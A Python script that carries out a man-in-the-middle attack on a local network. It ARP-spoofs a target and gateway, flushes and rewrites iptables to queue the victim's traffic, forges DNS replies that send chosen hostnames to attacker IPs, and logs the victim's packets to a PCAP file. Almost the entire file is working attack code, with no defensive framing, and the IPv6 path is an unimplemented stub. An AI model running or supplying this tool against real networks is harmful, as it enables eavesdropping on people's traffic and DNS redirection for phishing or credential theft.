import socket
import os
import scapy.all as scapy
from scapy.layers.inet6 import neighsol
import argparse
import errno
import sys
import ipaddress
from netfilterqueue import NetfilterQueue
import multiprocessing as mp
import time

from utils import *

# block all encrypted traffic to these endpoints.
DOH_BLOCKED_SERVERS = [
    '1.1.1.1',
    '1.0.0.1',
    '8.8.8.8',
    '8.8.4.4'
]

def get_mac_arp(ip_addr, interface):
    eth_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_packet = scapy.ARP(pdst = ip_addr)
    ans, unans = scapy.srp(eth_packet / arp_packet, timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
    
def get_mac_ndp(ip_addr, interface):
    print(scapy.inet6)

def arp_attack(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    print(f"> Target IP: {target_ip}, Target MAC: {target_mac}, Gateway IP: {gateway_ip}, Gateway MAC: {gateway_mac}", flush=True)
    print("> Beginning ARP Spoof attack", flush=True)

    p = mp.current_process()

    while getattr(p, 'is_running', True):
        scapy.send(
            scapy.ARP(
                op = 2, 
                pdst = target_ip, 
                psrc = gateway_ip, 
                hwdst = target_mac
            ), iface=interface
        )
        scapy.send(
            scapy.ARP(
                op = 2, 
                pdst = gateway_ip, 
                psrc = target_ip, 
                hwdst = gateway_mac
            ), iface=interface
        )

def arp_cleanup(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    print("> Cleaning up ARP spoofing", flush=True)
    
    print("> Re-ARPping target and gateway", flush=True)
    scapy.send(scapy.ARP(
        op = 2, 
        pdst = gateway_ip, 
        psrc = target_ip, 
        hwdst = "ff:ff:ff:ff:ff:ff", 
        hwsrc = target_mac
    ), iface = interface, count = 10)
    scapy.send(scapy.ARP(
        op = 2, 
        pdst = target_ip, 
        psrc = gateway_ip, 
        hwdst = "ff:ff:ff:ff:ff:ff", 
        hwsrc = gateway_mac
    ), iface = interface, count = 10)

    print("> Disabling IP forwarding", flush=True)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    print('> ARP spoofing cleanup finished', flush=True)

def get_network_adapter():
    adapters = socket.if_nameindex()

    print("> Select the network adapter to use (by name or number)")

    adapters_map = {}

    for adapter_number, adapter_name in adapters:
        print(f"{adapter_number}: {adapter_name}")
        adapters_map[adapter_number] = adapter_name

    while True:
        selected_adapter = input("> ")

        if len(selected_adapter) == 0:
            continue

        if len(selected_adapter) < 2 and selected_adapter[0].isnumeric():
            # assume length less than 2 is int
            try:
                selected_adapter_num = int(selected_adapter)
                return adapters_map[selected_adapter_num]
            except:
                print("> Unable to determine selected adapter as integer. Try full name")
                continue

        for v in adapters_map.values():
            if v == selected_adapter:
                return v
            
        print("> Unable to determine adapter. Try again")

class PacketHandler():
    def __init__(self, interface, target_ip, spoof_map = None, pcap_path = None) -> None:
        self.interface = interface
        self.target_ip = target_ip
        self.self_ip = scapy.get_if_addr(interface)
        self.spoof_map = spoof_map or {} # mapping of fake DNS urls to IP addresses
        self.spoof_all = isinstance(self.spoof_map, str)

        self.pcap_path = pcap_path
        self.pcap_buffer = []
        self.pcap_last_write = 0
        self.pcap_max_write = 60

    def handle_udp(self, packet):
        if packet.haslayer(scapy.DNS) and packet.haslayer(scapy.DNSQR):
            self.handle_dns(packet)
            return False
        return True
    
    def add_pcap_entry(self, packet):
        if self.pcap_path is None:
            return
        
        self.pcap_buffer.append(packet)

        if time.time() < self.pcap_last_write + self.pcap_max_write:
            self.write_pcap_entries()
            self.pcap_last_write = time.time()

    def write_pcap_entries(self):
        if len(self.pcap_buffer) == 0:
            return

        scapy.wrpcap(self.pcap_path, self.pcap_buffer, append=True)
        self.pcap_buffer = []

    def make_dns(self, packet, spoof_ip = None):      
        ip = scapy.IP(
            src = packet[scapy.IP].dst,
            dst = packet[scapy.IP].src
        )

        udp = scapy.UDP(
            dport = packet[scapy.UDP].sport,
            sport = packet[scapy.UDP].dport
        )

        dns = scapy.DNS(
            id = packet[scapy.DNS].id,
            qd = packet[scapy.DNS].qd,
            aa = 1,
            rd = 0,
            qr = 1,
            qdcount = 1,
            ancount = 1,
            nscount = 0,
            arcount = 0,
            ar = scapy.DNSRR(
                rrname = packet[scapy.DNS].qd.qname,
                type = 'A',
                ttl = 600,
                rdata = spoof_ip
            )
        )

        return ip / udp / dns
    
    def get_dns_entry(self, hostname):
        try:
            res = socket.gethostbyname(hostname)
            return res
        except:
            return None
    
    def handle_dns(self, packet):
        qname = packet[scapy.DNSQR].qname

        if len(qname) > 4 and qname[-5:] == 'lan.':
            return

        if self.spoof_all:
            packet = self.make_dns(packet, self.spoof_map)
            self.add_pcap_entry(packet)
            scapy.send(packet, iface=self.interface)

            print(f'> Intercepted DNS request to {qname.decode("utf-8")} Modified host IP to {self.spoof_map}')
            return

        if len(self.spoof_map) == 0:
            ip = self.get_dns_entry(qname)

            if ip is None:
                return

            packet = self.make_dns(packet, ip)
            self.add_pcap_entry(packet)
            scapy.send(packet, iface=self.interface)
            return

        if qname not in self.spoof_map:
            ip = self.get_dns_entry(qname)

            if ip is None:
                return
        else:
            ip = self.spoof_map[qname]
            print(f'> Intercepted DNS request to {qname.decode("utf-8")} Modified host IP to {ip}')
        
        packet = self.make_dns(packet, ip)
        self.add_pcap_entry(packet)
        scapy.send(packet, iface=self.interface)

    def handle_tcp(self, packet):
        self.add_pcap_entry(packet)

        return True

    def handle_packet(self, pkt):
        packet = scapy.IP(pkt.get_payload())

        if packet.haslayer(scapy.UDP):
            if self.handle_udp(packet):
                pkt.accept()
        elif packet.haslayer(scapy.TCP):
            if self.handle_tcp(packet):
                pkt.accept()
        else:
            pkt.accept()
       
def mitm_proxy(interface, target_ip, spoof_map, pcap_path):
    nfqueue = NetfilterQueue()
    packet_handler = PacketHandler(interface, target_ip, spoof_map, pcap_path)
    nfqueue.bind(1, packet_handler.handle_packet)

    print("> NFQueue binded. Packet manipulation starting")

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('> Closing MITM proxy')
    nfqueue.unbind()
    packet_handler.write_pcap_entries()
                
def init_ip_tables(target_ip, nf_queue):
    print("> Enabling IP Forwarding...", flush=True)
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    except IOError as e:
        if e[0] == errno.EPERM:
            print("Program requires root permissions (or sudo) to do ARP spoof attack", flush=True)
            return

    # remove all ip table rules
    os.system('iptables -F')

    # Intercept TCP traffic from victim IP
    os.system(f'iptables -I FORWARD -s {target_ip} -j NFQUEUE --queue-num {nf_queue}')
    os.system(f'iptables -I FORWARD -d {target_ip} -j NFQUEUE --queue-num {nf_queue}')

    print("> IPTables rules initialized")

def destroy_ip_tables():
    os.system('iptables -F')

    print("> IPTables rules destroyed")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='target IP address, in human-readable form, dot separated', type=str)
    parser.add_argument('-g', '--gateway', help='network gateway IP address, in human-readable form, dot separated', type=str)
    parser.add_argument('-i', '--interface', help='interface to use. If not provided, will be prompted for', type=str)
    parser.add_argument('-q', '--nf-queue', help='queue to use for NFqueue redirection', type=int, default=1)
    parser.add_argument('-s', '--spoof-ip', help=""" 
        Either a single IP to spoof for all DNS requests (i.e 1.2.3.4),
        a mapping of host names to IPs, passed as a list (i.e google.com 1.2.3.4 microsoft.com 5.6.7.8),
        or a path to JSON file formatted as key-value pairs, such as {'google.com': '1.2.3.4', ...}
    """, nargs='+')
    parser.add_argument('-p', '--pcap', type=str, help='Path to PCAP file of all target traffic')
    parser.add_argument('-np', '--no-prompt', action='store_true', help='Prompt for PCAP path and hostname/IP pairs. Does not disable prompt for interface, must manually set interface command option.')
    parser.add_argument('-4', '--ipv4', action='store_true', help='Use IPv4 and ARP packets')
    parser.add_argument('-6', '--ipv6', action='store_true', help='Use IPv6 and NDP')

    args = parser.parse_args()

    if args.target is None:
        print("> Target IP argument required -t/--target. See <prog_name> --help for more info.")
        sys.exit(1)
    if args.gateway is None:
        print("> Gateway IP argument required -g/--gateway. See <prog_name> --help for more info.")
        sys.exit(1)

    if args.ipv4 and args.ipv6:
        print("> Cannot use both IPv4 and IPv6, choose one")
        sys.exit(1)

    if args.no_prompt and args.pcap is None:
        pcap_path = None
    elif args.pcap is not None:
        pcap_path = args.pcap

        if pcap_path[0] not in {'.', '/'}:
            pcap_path = './' + pcap_path

        if not validate_path(pcap_path):
            print("> Invalid path. Unable to create PCAP at provided path")
            sys.exit(1)
    else:
        pcap_path = prompt_pcap_path()

    if args.no_prompt and args.spoof_ip is None:
        spoof_map = {}
    elif args.spoof_ip is None:
        spoof_map = prompt_spoof_ips()
    else:
        spoof_map = load_spoof_ips(args.spoof_ip)

    if isinstance(spoof_map, str):
        print(f"> Spoofing all DNS responses with {spoof_map}")
    else:
        print(f"> Spoofing {len(spoof_map)} DNS entries")

    try:
        ipaddress.ip_address(args.target)
    except:
        print("> Target IP is not a valid IP Address")
    try:
        ipaddress.ip_address(args.gateway)
    except:
        print("> Gateway IP address is not a valid IP")

    scapy.conf.verb = False

    interface = args.interface or get_network_adapter()
    init_ip_tables(args.target, args.nf_queue)

    if args.ipv4:
        print("> Using IPv4 and ARP packets")
        print("> Getting MAC address of gateway and victim")
        target_mac = get_mac_arp(args.target, interface)
        gateway_mac = get_mac_arp(args.gateway, interface)

        arp_process = mp.Process(target=arp_attack, args = (args.target, args.gateway, target_mac, gateway_mac, interface), daemon=True)
        mitm_process = mp.Process(target=mitm_proxy, args = (interface, args.target, spoof_map, pcap_path), daemon=True)
        
        try:
            arp_process.start()
            mitm_process.start()

            print("> Enter ctrl+c to quit. Wait for cleanup to ensure ARP attack is disabled properly")
            while True:
                ...

        except KeyboardInterrupt:
            print("> Received ctrl+c, exiting")
            arp_process.is_running = False
            mitm_process.is_running = False
            arp_process.join()
            mitm_process.join()

        arp_cleanup(args.target, args.gateway, target_mac, gateway_mac, interface)
    else:
        print("> Using IPv6 and NDP packets")
        print("> Not implemented yet")
    destroy_ip_tables()